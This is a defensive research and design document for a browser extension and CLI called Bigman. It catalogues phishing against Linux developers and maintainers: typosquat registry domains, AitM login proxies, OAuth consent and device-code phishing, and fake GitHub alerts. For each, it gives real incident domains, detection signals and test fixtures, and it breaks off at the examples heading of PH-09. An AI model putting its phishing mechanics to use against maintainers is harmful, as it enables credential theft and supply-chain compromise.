# Phishing and social engineering against Linux users, developers and maintainers

> Scope: deceptive links, lookalike domains, credential and token phishing, consent and device-code abuse, fake alerts, fake interviews, "paste this into your terminal" lures, clipboard tampering, fake update and download pages, and impersonated developer-ecosystem pages (registries, IDE marketplaces, container hubs). These target Linux desktop users and especially open-source maintainers, whose stolen registry or GitHub credentials turn into supply-chain compromises. In Bigman the main defenses are the Chromium MV3 browser extension (`browser-extension/`) and the installer inspector (`bigman inspect`). What happens after a malicious package is published is covered in [supply-chain](./02-supply-chain-packages.md). Download channels and `curl | bash` are covered in [distro packaging](./03-distro-packaging-and-install-channels.md), and token storage in [credentials](./06-credential-and-secret-protection.md). Last researched: 2026-10-29.

## How the current extension behaves (baseline for this file)

These observations come from reading `browser-extension/link-detector.js`, `content.js`, `background.js`, `warning.js` and `config/brand-domains.json` (v0.2.0). I also ran the detector against synthetic URLs from the incidents below.

- **Scan scope.** The content script runs at `document_end` in all frames of `http(s)` pages. It analyzes up to 3,000 `a[href]` elements per scan, re-runs through a `MutationObserver`, and re-checks a link at click time (`click` and `auxclick`, capture phase, `isTrusted` only).
- **Rules.**

  | Rule | What it checks |
  |---|---|
  | `domain.mismatch` | The visible domain in the link text resolves to a different registrable domain (PSL via `tldts`) than the href. |
  | `email.mismatch`, `phone.mismatch` | The visible address or number differs from the `mailto:`, `tel:` or `sms:` target. |
  | `url.userinfo` | The URL contains `user@`. |
  | `url.active` | The scheme is `javascript:`, `data:` or `file:`. |
  | `list.match` | The domain or exact URL is in a blocklist the user imported. |
  | `domain.confusable` | A 13-character Cyrillic/Greek skeleton matches one of about 60 brands. |
  | `domain.typo` | Levenshtein distance of 1 from a brand, applied only when both strings are at least 5 characters. |
  | `domain.brand` | A brand name appears as a label, subdomain or `brand-` prefix outside the brand's domains. |
  | `domain.idn` | Any other punycode hostname (`info` only). |
  | `url.http` | Plain HTTP (`info` only). |
  | `page.clickfix` | Page text combines verification wording, a terminal or Run reference, and a paste instruction. |

- **Warning page.** Shows the reason and the URL, offers "continue", and offers a 1-hour per-hostname exception, which is withheld for `list.match`.
- **Probe results against real incident domains:**

  | Domain or input | Result |
  |---|---|
  | `npnjs.com` | `domain.typo` |
  | `npmjs.help` | `domain.brand` |
  | `pypi-mirror.org` | `domain.brand` |
  | `github-scanner.com` | `domain.brand` |
  | `github.rustfoundation.dev` | `domain.brand` |
  | `github.com.evil.example` | `domain.brand` |
  | `xn--80ak6aa92e.com` (Cyrillic "аррӏе.com") | `domain.confusable` |
  | `pypj.org` (the July 2025 PyPI phishing domain) | **no finding**. The brand key `pypi` has only 4 characters, so the typo rule skips it. |
  | `rustfoundation.dev`, `brewe.sh`, `crates-io.dev`, `marketplace-visualstudio.com` | **no finding**. There are no brand entries for Rust, crates.io, Homebrew, VS Code Marketplace, Open VSX, Docker Hub or Flathub. |
  | `gíthub.com`, `gıthub.com` (dotless i), `pypı.com` | `info` only. Latin diacritics and dotless i are not in the confusable map. |
  | `bit.ly/...`, `google.com/url?q=<other site>` | **no finding**. Shorteners and redirect parameters are not inspected. |
  | `github.com/login/oauth/authorize?...`, `github.com/login/device` | **no finding**, because they are canonical. Consent and device-code phishing happens on the real site. |
  | `blob:` URLs | `unavailable`. They are not blocked at click time. |
  | Page text "press Alt+F2, paste the command (Ctrl+V)" | **no finding**. The terminal regex lacks Alt+F2 and "run dialog". |
  | Page text "camera driver error ... open Terminal and paste this command" | **no finding**. There is no verification keyword. |

- **Structural limits.**
  - Only `<a>` clicks are intercepted. `window.open`, form submissions, `location` assignments, meta refresh, typed URLs and navigations started from outside a page (desktop chat apps, mail clients, terminals) are not checked.
  - The manifest has no `host_permissions` and no `declarativeNetRequest`, so imported blocklists cannot stop a navigation that does not come from a clicked anchor.
  - Closed shadow roots are not scanned.

## Summary table

| ID | Attack | Severity for a Linux desktop/dev user | Bigman today | Proposed |
|---|---|---|---|---|
| PH-01 | Link text vs destination mismatch | Medium | Partial | Cover buttons, `onclick` and `window.open` navigations, `title`/`aria-label`, and link previews; compare at the full-hostname level. |
| PH-02 | Lookalike and typosquat domains of developer services | High | Partial | Developer-ecosystem brand pack plus a canonical-origin allowlist; fix the short-brand gap (`pypj.org`); add dnstwist-style permutations. |
| PH-03 | IDN homoglyph and mixed-script domains | Medium | Partial | Full UTS #39 `confusables.txt` skeletons, mixed-script and whole-script checks matching Chromium's IDN policy. |
| PH-04 | Open redirects and trusted-host chaining | Medium | Gap | Unwrap known redirector parameters and evaluate the inner URL. |
| PH-05 | Registry and forge credential phishing with AitM proxies (npm, PyPI, crates.io, GitHub) | High | Partial | Credential-entry guard: warn before a password or OTP is typed on a non-canonical origin that presents a protected brand. |
| PH-06 | Fake security-alert notifications through real platform channels | High | Partial | Flag links in GitHub notification pages and issues that lead to non-GitHub "scanner" or "security" hosts; add guidance on the warning page. |
| PH-07 | OAuth consent phishing (malicious OAuth or GitHub apps) | High | Gap | Consent-page explainer that surfaces scopes, app name, publisher and referrer; warn on write or admin scopes reached from an external link. |
| PH-08 | Device-code phishing (GitHub, Microsoft, others) | High | Gap | Content script on device-login pages: "Did you start this login yourself, on this computer?" Interstitial when the page was reached from a link. |
| PH-09 | Malicious links in issue, PR, discussion and review comments | Medium | Partial | Forge-aware rules: flag archive or download hosts and shorteners in comments by new accounts; download-scan results surfaced inline. |
| PH-10 | Fake job-interview and collaboration lures | High | Partial | `bigman repo-check URL` reads a take-home before cloning; loader, disguised-font and AI-settings rules; extension rule for "interview" pages that push terminal commands or "camera driver" fixes. |
| PH-11 | ClickFix / fake CAPTCHA "paste into terminal or Run dialog" (Linux variants) | High | Partial | Linux phrases (Alt+F2, Ctrl+Alt+T, "terminal"); correlate with page clipboard writes; send copied text to the installer inspector. |
| PH-12 | Clipboard hijacking of terminal commands (pastejacking, hidden text, zero-width and bidi characters) | High | Gap | Copy guard: compare selection and clipboard payload; flag trailing newline, invisible or bidi characters, hidden DOM text; `doctor` check for bracketed paste. |
| PH-13 | Malicious QR codes (quishing) | Low | Gap | Optional local QR decode of page images and pasted screenshots; run the decoded URL through the link rules. |
| PH-14 | Browser-in-the-browser fake login windows | Medium | Gap | Detect in-page elements that draw a fake browser chrome with an address bar containing a protected domain plus a password field. |
| PH-15 | Fake update prompts (browser, conferencing, driver, "missing component") | High | Partial | Page rule for update wording plus a download or paste instruction; flag downloads that the page claims are browser updates. |
| PH-16 | Chat-platform link spam and invite hijacking aimed at OSS communities | Medium | Partial | Extend rules to web chat clients; warn on "verify" bots that lead to off-platform pages; guidance for permanent invites. |
| PH-17 | Search-ad and SEO poisoning of Linux software download pages | High | Gap | "Official download origin" list for popular Linux tools; flag install-command pages on non-official origins. |
| PH-18 | Fake IDE-extension, container-image and package pages | Medium | Gap | Brand entries for Marketplace, Open VSX, Docker Hub, Flathub and Snapcraft; publisher/namespace lookalike checks. |
| PH-19 | URL shorteners and multi-hop redirect chains | Medium | Gap | Shortener list; warning page offers a bounded, non-rendering redirect walk through the native host (`inspect-url`). |
| PH-20 | `data:`, `javascript:`, `blob:` and `file:` URLs and HTML attachments | Medium | Partial | Add `blob:` and `filesystem:`; flag local HTML files that contain credential forms. |
| PH-21 | Userinfo and target-embedding URLs (`github.com@...`, `github.com.evil.tld`) | Medium | Covered | Keep the rules; extend to brands added in PH-02 and PH-18. |

## Attacks

### PH-01 Link text vs destination mismatch
- **What it is:** The visible text of a link, button or email shows one address (for example `github.com/org/repo/security`), while the actual navigation goes somewhere else. The destination may be set in `href`, changed at `mousedown`, or produced by a JavaScript `onclick` that calls `window.open`. It is the oldest phishing trick and still the base of most campaigns below. On developer platforms, rendered Markdown makes `[github.com/x](https://elsewhere)` trivial.
- **Real-world examples:**
  - The mr.d0x browser-in-the-browser write-up (2022) shows how `onclick` handlers return `false` so that the hover preview differs from the real action: https://mrd0x.com/browser-in-the-browser-phishing-attack/
  - GitHub "security alert" issues (2025) used link text that looked like GitHub account-security pages but led to an OAuth authorization for an attacker app ([PH-06](#ph-06-fake-security-alert-notifications-through-real-platform-channels)).
  - Dhamija, Tygar and Hearst (CHI 2006) showed that users do not check this reliably.
- **What a defender inspects:** Browser history for the clicked URL versus what the user remembers. In Chromium this is the `History` SQLite file, which should be copied before reading. Also the raw source of the email or notification.
- **Deterministic signals (MV3 content script / warning page):**
  - `anchor.textContent`, `title` and `aria-label` contain a hostname whose registrable domain differs from `new URL(href)`.
  - `href` changes between hover (`mouseover`) and click. Record the value at `pointerdown` and compare it at `click`.
  - Anchors or buttons with an `onclick` attribute and an `href` of `#`, or of `javascript:void(0)`.
  - Elements styled as links (`role="link"`, `cursor:pointer`) without an `href`.
  - Markdown-rendered links on forge pages, where `a` text is a URL that differs from `href`.
- **Bigman today:** **Partial.** `domain.mismatch`, `email.mismatch` and `phone.mismatch` compare the registrable domain in visible anchor text against `href`, and the check is repeated at click time. Not covered: buttons and non-anchor click handlers, `window.open`, hover/click href swaps, `title`/`aria-label` text, and same-registrable-domain mismatches on multi-tenant hosts such as `user.github.io`. `tldts` is called with `allowPrivateDomains: true`, so `github.io` users count as separate registrable domains, which is good.
- **Proposed mitigation / detection:**
  - Extension: record `href` at `pointerdown` and re-check at `click`.
  - Add a MAIN-world shim (MV3 `world: "MAIN"`) that wraps `window.open` and reports the URL to the isolated content script for the same `analyzeLink`.
  - Include `title` and `aria-label` in the visible-text comparison.
  - On the warning page, show the decoded hostname with the registrable part highlighted, as Chrome does in its omnibox.
- **Test case idea:** A jsdom fixture with `<a href="https://example.invalid/x">github.com/org/repo</a>`, plus an anchor whose `href` is rewritten in a `mousedown` handler. Assert `domain.mismatch` in both cases and assert that the click is prevented.
- **References:**
  - https://mrd0x.com/browser-in-the-browser-phishing-attack/
  - https://doi.org/10.1145/1124772.1124861
  - https://doi.org/10.1145/3313831.3376298
  - MITRE ATT&CK T1566.002 https://attack.mitre.org/techniques/T1566/002/ and T1204.001 https://attack.mitre.org/techniques/T1204/001/

### PH-02 Lookalike and typosquat domains of developer services
- **What it is:** Attackers register domains that differ from a real service by one character, a swapped letter, an extra word or a different TLD. Examples are `npnjs.com`, `npmjs.help`, `pypj.org`, `pypi-mirror.org`, `rustfoundation.dev` and `brewe.sh`. They host a pixel-perfect copy of the login page, or proxy the real one. Developer services are high value because one phished maintainer can push malware to millions of installs.
- **Real-world examples:**

  | Date | Domain | What happened | Source |
  |---|---|---|---|
  | 2025-07 | `npnjs.com` | Phishing of a Prettier-ecosystem maintainer led to malicious `eslint-config-prettier` 8.10.1/9.1.1/10.1.6/10.1.7, `eslint-plugin-prettier`, `synckit`, `@pkgr/core` and `napi-postinstall` (CVE-2025-54313). | Socket, 2025-07-19: https://socket.dev/blog/npm-phishing-campaign-leads-to-prettier-tooling-packages-compromise |
  | 2025-07 | `pypj.org` | Four PyPI accounts were phished and malicious `num2words` 0.5.15/0.5.16 was uploaded (PYSEC-2025-72). | PyPI incident report, 2025-07-31: https://blog.pypi.org/posts/2025-07-31-incident-report-phishing-attack/ |
  | 2025-09-08 | `npmjs.help` (registered 2025-09-05) | Maintainer "Qix" was phished; 18 packages, including `chalk` and `debug`, were published with a crypto-address-swapping payload. | Aikido: https://www.aikido.dev/blog/npm-debug-and-chalk-packages-compromised ; GHSA-4x49-vf9v-38px: https://osv.dev/vulnerability/GHSA-4x49-vf9v-38px |
  | 2025-09 | `rustfoundation.dev` | Emails falsely claimed a crates.io breach and harvested GitHub credentials. | Rust blog, 2025-09-12: https://blog.rust-lang.org/2025/09/12/crates-io-phishing-campaign |
  | 2025-09 | `pypi-mirror.org` | Second PyPI phishing wave. | PyPI blog, 2025-09-23: https://blog.pypi.org/posts/2025-09-23-plenty-of-phish-in-the-sea/ |
  | 2025-01 | `brewe.sh` | Google ads displayed `brew.sh` but led to a fake Homebrew site (see [PH-17](#ph-17-search-ad-and-seo-poisoning-of-linux-software-download-pages)). | BleepingComputer, 2025-01-21 |

- **What a defender inspects:**
  - The account's security history on each registry: PyPI "Security history", the npm account page, crates.io API tokens.
  - Read-only token listings: `npm token list` and `gh auth status`.
  - Browser history and password-manager history for logins to hosts that are not the canonical domain.
- **Deterministic signals:**
  - The registrable domain is not in the canonical set for the brand, but:
    - the label matches `brand`, `brand-*` or `*-brand`, or `brand` appears as a subdomain;
    - edit distance or a keyboard-adjacent substitution from the brand's registrable label is at most 1–2 (with tighter rules for short brands);
    - the label is the brand with a different TLD (`npmjs.help`, `pypi.dev`);
    - the brand plus a service word (`-security`, `-support`, `-mirror`, `-scanner`, `-verify`) forms a combosquat.
  - The page `<title>`, favicon `alt`, form `action`, or logo `img[alt]` names the brand while the origin is non-canonical (CANTINA-style identity check).
  - Newly seen domain. Bigman can keep a local first-seen timestamp per registrable domain, with no network call.
- **Bigman today:** **Partial.**
  - `domain.typo` and `domain.brand` catch `npnjs.com`, `npmjs.help`, `pypi-mirror.org`, `github-scanner.com` and `github.rustfoundation.dev`.
  - They **miss `pypj.org`**, because the typo rule requires the brand key to be at least 5 characters and `pypi` has 4.
  - They miss `rustfoundation.dev`, `brewe.sh` and `crates-io.dev`, which have no brand entries.
  - The brand list is consumer and finance heavy. Developer brands present: `github`, `gitlab`, `npmjs`, `pypi`, `python`, `stackoverflow`, `slack`, `discord`.
- **Proposed mitigation / detection:**
  - Extension: add a versioned "developer ecosystem" brand pack.

    | Area | Canonical domains |
    |---|---|
    | npm | `npmjs.com`, `npmjs.org` |
    | PyPI | `pypi.org`, `pythonhosted.org`, `python.org` |
    | Rust | `crates.io`, `rust-lang.org`, `rustfoundation.org` |
    | RubyGems | `rubygems.org` |
    | Packagist | `packagist.org` |
    | Go | `go.dev`, `pkg.go.dev`, `proxy.golang.org` |
    | Java | `maven.org`, `central.sonatype.com` |
    | .NET | `nuget.org` |
    | Forges | `github.com`, `githubusercontent.com`, `gitlab.com`, `codeberg.org`, `sourceforge.net` |
    | Containers | `docker.com`, `hub.docker.com`, `quay.io`, `ghcr.io` |
    | IDE marketplaces | `marketplace.visualstudio.com`, `open-vsx.org` |
    | Desktop apps | `flathub.org`, `snapcraft.io`, `brew.sh` |
    | Distributions | `kernel.org`, `debian.org`, `ubuntu.com`, `fedoraproject.org`, `archlinux.org`, `opensuse.org` |

    Verify each canonical domain list against the official site before shipping.
  - Separate brand *keys* from canonical *registrable labels*, so short brands (`pypi`, `npm`, `brew`) get exact-label checks and distance-1 checks against their own registrable label under any TLD. Accept that this produces some false positives and present them as "review", not "block".
  - Pre-compute dnstwist-style permutations (addition, omission, transposition, replacement, vowel-swap, hyphenation, homoglyph, bitsquatting, tld-swap) of the canonical labels at build time into a static set. This is deterministic and fast.
  - Feed-driven advisory: when a registry publishes a phishing notice, the [feeds research](../research/vulnerability-intelligence-and-feeds.md) pipeline proposes adding the domain to a bundled "known developer-phishing domains" list. The list is small, curated and Bigman-authored, so it can be redistributed.
- **Test case idea:** Table-driven Jest cases: `pypj.org`, `npnjs.com`, `npmjs.help`, `pypi-mirror.org`, `rustfoundation.dev`, `crates-io.dev` and `brewe.sh` must reach `review`. `pypi.org`, `files.pythonhosted.org`, `crates.io`, `static.crates.io` and `brew.sh` must be `none`. Include a regression case for the 4-character brand.
- **References:**
  - The incident URLs in the table above.
  - https://github.blog/security/supply-chain-security/our-plan-for-a-more-secure-npm-supply-chain/ (2025-09-22: npm moves to FIDO 2FA and deprecates TOTP)
  - https://github.com/elceef/dnstwist
  - MITRE T1583.001 https://attack.mitre.org/techniques/T1583/001/ and T1656 https://attack.mitre.org/techniques/T1656/

### PH-03 IDN homoglyph and mixed-script domains
- **What it is:** Internationalized domain names can use characters from other scripts that look like Latin letters. Examples are Cyrillic "а" for "a", dotless "ı", and Latin letters with small diacritics. A domain can then look identical to `apple.com` or `github.com` in some fonts. Browsers mitigate this by showing punycode (`xn--...`) for risky names, but the rules differ between browsers, and link text inside pages is not covered.
- **Real-world examples:**
  - Xudong Zheng's whole-script `аррӏе.com` demo, 2017-04-14 (fixed in Chrome 58/59; Firefox advised the `network.IDN_show_punycode` pref): https://www.xudongz.com/blog/2017/idn-phishing/
  - Holgers et al., 2006 measurement study of homograph registrations.
  - Trojan Source (CVE-2021-42574 / CVE-2021-42694) shows the same confusable problem in source code: https://trojansource.codes/
- **What a defender inspects:**
  - Punycode hostnames in browser history (`xn--` substrings).
  - The Firefox `network.IDN_show_punycode` pref, if the user runs Firefox (checked by reading `prefs.js`).
- **Deterministic signals:**
  - `URL.hostname` contains `xn--`.
  - After `punycode.toUnicode`, a label mixes scripts in a way that fails the UTS #39 Highly Restrictive profile.
  - A whole-script confusable: all-Cyrillic letters that map to Latin under a TLD that is not Cyrillic.
  - The UTS #39 `skeleton()` of the registrable label equals the skeleton of a protected brand's label.
  - The label contains invisible or combining characters, or mixes digit systems.
- **Bigman today:** **Partial.** `domain.confusable` uses a 13-entry Cyrillic/Greek map against the brand list. Everything else with `xn--` is `domain.idn` at `info` level. Probes showed `gíthub.com`, `gıthub.com` and `pypı.com` only reach `info`.
- **Proposed mitigation / detection:**
  - Extension build step: generate a skeleton map from Unicode `confusables.txt` (UTS #39, current version 18.0.0, revision 34, 2026-08-27).
  - Port Chromium's `IDNSpoofChecker` rules, documented in `docs/idn.md`: script-mixing limits, Latin/Cyrillic/Greek mixing ban, whole-script confusables by TLD, digit-lookalike labels, and top-domain skeleton match.
  - Apply them to both the destination and the hostname shown in link text.
  - Show the decoded name and the punycode name side by side on the warning page.
- **Test case idea:** Generate IDN labels from `confusables.txt` for `github`, `pypi` and `npmjs` (data only) and assert `review`. Assert that legitimate single-script IDNs under matching TLDs stay `info`.
- **References:**
  - https://www.unicode.org/reports/tr39/
  - https://chromium.googlesource.com/chromium/src/+/main/docs/idn.md
  - https://wiki.mozilla.org/IDN_Display_Algorithm
  - https://www.usenix.org/legacy/event/usenix06/tech/holgers.html
  - https://www.xudongz.com/blog/2017/idn-phishing/

### PH-04 Open redirects and trusted-host chaining
- **What it is:** Many trusted sites have redirect endpoints that forward to any URL passed in a query parameter. Examples are search-engine click trackers, social-media link shims, mail "safe link" rewriters, and marketing or analytics redirectors. Phishers start a link on a trusted domain so that link-text checks, mail filters and users see a reputable host. Bigman's registrable-domain comparison then sees the trusted outer host only.
- **Real-world examples:**
  - JFrog (2024-04-30): Docker Hub spam repositories switched in 2023 to "legitimate-looking redirects, such as a Blogger page and a Google open redirect" to reach malware and phishing. https://jfrog.com/blog/attacks-on-docker-with-millions-of-malicious-repositories-spread-malware-and-phishing-scams/
  - OWASP lists unvalidated redirects as a phishing enabler (CWE-601).
- **What a defender inspects:** The full URL in history or in the message source, decoding nested `url=`, `q=`, `u=`, `redirect=`, `next=`, `continue=` and `target=` parameters.
- **Deterministic signals:**
  - A query parameter value that parses as an absolute `http(s)` URL, possibly percent- or base64-encoded, whose registrable domain differs from the outer host.
  - The outer host is in a curated list of known redirectors, each with its parameter name.
  - Repeated nesting depth greater than 1.
- **Bigman today:** **Gap.** The probe `google.com/url?q=<other site>` returned `none`.
- **Proposed mitigation / detection:**
  - Extension: a "redirector unwrap" table mapping host and path to a parameter name, maintained as data. Evaluate the inner URL with `analyzeLink`.
  - Generic rule: any absolute URL inside a query parameter whose domain differs from the outer one gets an `info` finding, shown on the warning page as "this link forwards to X".
  - Never fetch the URL to resolve it. Parsing only.
- **Test case idea:** Fixture links on several known redirector hosts (data only) with inner targets `pypj.org` and `pypi.org`. Assert that the inner rule result propagates with rule ID `url.redirect-param`.
- **References:**
  - https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html
  - https://cwe.mitre.org/data/definitions/601.html
  - The JFrog post above.

### PH-05 Registry and forge credential phishing with AitM proxies (npm, PyPI, crates.io, GitHub)
- **What it is:** Maintainers receive an urgent email: "verify your email", "update 2FA", "account will be locked", or "infrastructure breached, re-authenticate". The link goes to a lookalike domain that relays the real login page live (adversary-in-the-middle). Because it relays live, it captures the password, the TOTP code and the session cookie. Only origin-bound authenticators (WebAuthn/passkeys) defeat it. A stolen session or token lets the attacker publish malicious versions within minutes.
- **Real-world examples:**

  | Date | Ecosystem | What happened | Source |
  |---|---|---|---|
  | 2025-07 | PyPI | `pypj.org` proxied PyPI; TOTP and session cookies were captured; 4 accounts compromised. | https://blog.pypi.org/posts/2025-07-31-incident-report-phishing-attack/ |
  | 2025-07 | npm | `npnjs.com` led to the Prettier tooling compromise (CVE-2025-54313). | https://socket.dev/blog/npm-phishing-campaign-leads-to-prettier-tooling-packages-compromise |
  | 2025-09-08 | npm | `npmjs.help`, 2FA-reset pretext; 18 packages including `chalk` and `debug`. | https://www.aikido.dev/blog/npm-debug-and-chalk-packages-compromised |
  | 2025-09 | crates.io | `rustfoundation.dev` aimed at GitHub credentials. | https://blog.rust-lang.org/2025/09/12/crates-io-phishing-campaign |
  | 2025-09 | PyPI | `pypi-mirror.org`. | https://blog.pypi.org/posts/2025-09-23-plenty-of-phish-in-the-sea/ |
  | 2025-09-22 | npm (response) | GitHub announced FIDO-only 2FA, short-lived tokens and trusted publishing, citing these account takeovers and Shai-Hulud. | https://github.blog/security/supply-chain-security/our-plan-for-a-more-secure-npm-supply-chain/ |
  | 2026 | npm | Unit 42 tracks further maintainer-account compromises (e.g. `atool` on 2026-05-19). It notes every Shai-Hulud wave began with a stolen or phished credential, but does not name a phishing domain for the 2026 waves. | https://unit42.paloaltonetworks.com/monitoring-npm-supply-chain-attacks/ |

  I found no verified 2026 crates.io or RubyGems phishing advisory; treat that as unverified rather than absent.
- **What a defender inspects:**
  - Registry security logs and token lists (`npm token list`, PyPI account security history, crates.io token page, GitHub security log at `https://github.com/settings/security-log`).
  - The 2FA type: TOTP is phishable, WebAuthn is not.
  - Browser history for registry login pages on non-canonical hosts.
  - Whether the password manager declined to autofill. PyPI explicitly recommends treating that as a red flag.
- **Deterministic signals:**
  - `input[type=password]`, `input[autocomplete~="one-time-code"]`, or 6-digit OTP fields on an origin that is not canonical for a brand named in `<title>`, the visible logo text, or form labels.
  - A form `action` pointing to a different registrable domain than the page.
  - The page loads the real brand's static assets (CSS or images from `github.githubassets.com` or `pypi.org/static`) from a non-canonical origin. This is a classic proxy or clone tell: check `performance.getEntriesByType('resource')` hostnames.
  - A WebAuthn/passkey prompt is absent where the canonical site would offer one. This is not deterministic; use it only as guidance.
- **Bigman today:** **Partial.** Lookalike rules catch several of the real domains (see PH-02) but miss `pypj.org` and `rustfoundation.dev`. There is no credential-field awareness, so a proxied login on an unknown domain produces no finding.
- **Proposed mitigation / detection:**
  - Extension "credential-entry guard": on `focus` of a password or OTP field, run a deterministic identity check (brand tokens in title, labels and logo `alt`, plus canonical-origin list). If the origin is non-canonical, show an in-page banner and block form submission until the user confirms on the warning page.
  - CLI `bigman doctor`, read-only advisories:
    - list npm tokens and their types when `npm` is logged in (`npm token list`);
    - report `gh auth status` scopes;
    - remind maintainers to switch PyPI, npm and GitHub to WebAuthn.
  - These are guidance rows, never pass/fail claims.
- **Test case idea:** A jsdom fixture page titled "Sign in to PyPI" with a password field, served from `https://pypj.example/`. Assert `credential.non-canonical` on focus. The same fixture at `https://pypi.org/account/login/` gives no finding.
- **References:**
  - The incident URLs above.
  - MITRE T1557 https://attack.mitre.org/techniques/T1557/, T1539 https://attack.mitre.org/techniques/T1539/, T1111 https://attack.mitre.org/techniques/T1111/
  - Cross-reference: [credential protection](./06-credential-and-secret-protection.md)

### PH-06 Fake security-alert notifications through real platform channels
- **What it is:** Attackers open issues, discussions or comments on public repositories titled "Security Alert", "Unusual access attempt" or "Security vulnerability detected". The platform then sends a real notification email from its own address to watchers, which defeats sender checks. The link leads to a fake scanner page (often ClickFix, see PH-11) or to an OAuth consent screen (PH-07).
- **Real-world examples:**
  - 2024-09, "GitHub Scanner": issues pointed to `github-scanner[.]com`, which showed a fake "verify you are human" check that copied a command to the clipboard. The command delivered Lumma Stealer on Windows. https://www.bleepingcomputer.com/news/security/clever-github-scanner-campaign-abusing-repos-to-push-malware/ ; SANS ISC https://isc.sans.edu/diary/31282
  - 2025-03, "gitsecurityapp": fake "Security Alert" issues on about 12,000 repositories linked to an OAuth app requesting repo, workflow and delete permissions. https://www.helpnetsecurity.com/2025/03/17/github-project-maintainers-targeted-with-fake-security-alert
- **What a defender inspects:**
  - GitHub notification emails: the issue author's account age and the issue's repository.
  - Authorized OAuth apps at `https://github.com/settings/applications`.
  - The security log for `oauth_authorization` events.
- **Deterministic signals:**
  - On `github.com/*/issues/*` and on notification pages, issue body links to non-GitHub hosts whose label contains `github`, `security`, `scanner`, `alert` or `verify`.
  - Links to `/login/oauth/authorize` from an issue body (see PH-07).
  - Issue title matches alert wording ("security alert", "unusual access", "vulnerability detected").
  - The author is not a member of the repository. The `Author` / `Contributor` / `Member` association badge is in the DOM, so this is deterministic but fragile.
- **Bigman today:** **Partial.** `domain.brand` flags `github-scanner.com`. A link to the real `github.com/login/oauth/authorize` produces no finding.
- **Proposed mitigation / detection:** Extension "forge context" module for github.com, gitlab.com and codeberg.org: when an issue or comment contains alert wording plus an external or OAuth link, add a `forge.fake-alert` review finding. The warning page states: "GitHub does not send security alerts as issues; check Settings > Security log directly."
- **Test case idea:** Saved static HTML of a synthetic GitHub-like issue page (no real content) with alert wording and a link to `https://example.invalid/scanner`. Assert the finding. A benign issue with the same link and no alert wording gives only the normal link result.
- **References:**
  - The URLs above.
  - MITRE T1566.003 https://attack.mitre.org/techniques/T1566/003/

### PH-07 OAuth consent phishing (malicious OAuth or GitHub apps)
- **What it is:** Instead of stealing a password, the attacker gets the victim to click "Authorize" on the *real* GitHub, GitLab, Google or Microsoft consent page for an attacker-controlled app. The resulting token often has repo, workflow or delete scopes. It survives password changes and bypasses 2FA, because the user approved it. Lookalike-domain rules cannot see this; the page is canonical.
- **Real-world examples:**
  - 2025-03, "gitsecurityapp": scopes included repo access, workflow updates and repository deletion. https://www.helpnetsecurity.com/2025/03/17/github-project-maintainers-targeted-with-fake-security-alert
  - 2022-04, impact of stolen OAuth user tokens (Heroku and Travis CI integrations): attackers cloned private repositories, including npm's, and mined them for secrets. This was token theft, not consent phishing, but it shows what an OAuth token buys. https://github.blog/news-insights/company-news/security-alert-stolen-oauth-user-tokens/
- **What a defender inspects:**
  - GitHub Settings > Applications > Authorized OAuth Apps / Authorized GitHub Apps. Check app name, owner, scopes and last-used date.
  - The GitHub security log.
  - Read-only `gh api user/installations` for GitHub App installations visible to the user.
  - Unexpected workflow files or gists created after the authorization.
- **Deterministic signals:**
  - URL path `/login/oauth/authorize` (GitHub) or `/oauth/authorize` (GitLab) with a `scope` query parameter containing write or admin scopes (`repo`, `workflow`, `delete_repo`, `admin:*`, `write:packages`).
  - `document.referrer` is empty or external (the user arrived from an email or issue link, not from the app's own site).
  - The DOM on the consent page shows the app owner and its "created N days ago" or "N users" text, when present.
- **Bigman today:** **Gap.**
- **Proposed mitigation / detection:**
  - Extension consent-page explainer: a content script on canonical consent URLs shows a banner listing requested scopes in plain words ("can delete repositories", "can change GitHub Actions workflows") and the referrer host.
  - If high-risk scopes are requested after an external referral, ask for an explicit confirmation step before "Authorize". The check is read-only: no DOM modification of the provider form beyond an overlay.
  - CLI: a `bigman doctor` advisory row linking to the authorized-apps page.
- **Test case idea:** Unit-test a pure function `classifyOAuthUrl(url, referrer)` with synthetic URLs containing `scope=repo%20workflow%20delete_repo` and an external referrer. Assert `oauth.high-scope`.
- **References:**
  - https://docs.github.com/en/apps/oauth-apps/building-oauth-apps/scopes-for-oauth-apps
  - MITRE T1528 https://attack.mitre.org/techniques/T1528/ and T1550.001 https://attack.mitre.org/techniques/T1550/001/

### PH-08 Device-code phishing (GitHub, Microsoft, others)
- **What it is:** The OAuth device flow lets a TV or CLI show a short code that the user types at a vendor page such as `github.com/login/device`. An attacker starts the flow, sends the victim the code with a pretext ("enter this code to join the meeting" or "verify your account"), and receives the token when the victim enters it on the genuine site. No lookalike domain is involved, so URL reputation is useless.
- **Real-world examples:**
  - Microsoft, 2025-02-13: Storm-2372 used fake Teams invites to deliver device codes, active since 2024-08. https://www.microsoft.com/en-us/security/blog/2025/02/13/storm-2372-conducts-device-code-phishing-campaign/
  - Praetorian, 2025-06-12: GitHub device-code phishing; reports over 90% completion when developers were phoned. A vendor figure. https://www.praetorian.com/blog/introducing-github-device-code-phishing/
- **What a defender inspects:**
  - The GitHub security log and organization audit log (`org_credential_authorization.grant` per Praetorian).
  - Recently authorized OAuth apps whose client IDs belong to well-known tools (e.g. the VS Code or GitHub CLI app) that the user did not knowingly authorize.
  - `gh auth status` for unexpected tokens.
- **Deterministic signals:**
  - Visits to device-login pages (`github.com/login/device` and the Microsoft device-login pages; maintain a list).
  - `document.referrer` is external, or the page was opened by a link click rather than typed.
  - Paste events in the code field. Pasting rather than reading the code from a local terminal suggests the code came from someone else. This is a heuristic, so give it `info` level.
- **Bigman today:** **Gap.**
- **Proposed mitigation / detection:** Extension: a content script on device-login URLs shows an interstitial banner: "Only enter a code that a program on *this* computer just showed you. If someone sent you this code, stop." It is stronger when the referrer is a mail, chat or meeting domain. Optional `bigman doctor` reminder.
- **Test case idea:** jsdom page at `https://github.com/login/device` with a synthetic external referrer. Assert that the banner is injected and that `device.external-referral` is recorded.
- **References:**
  - The two URLs above.
  - https://docs.github.com/en/apps/oauth-apps/building-oauth-apps/authorizing-oauth-apps#device-flow
  - MITRE T1528

### PH-09 Malicious links in issue, PR, discussion and review comments
- **What it is:** Bots post "helpful" comments on issues offering a fix or a binary, linking to file hosts or shorteners. Often the archive is password-protected so scanners cannot open it. Maintainers and users who are stuck on a bug are primed to try it.
- **Real-world examples:**
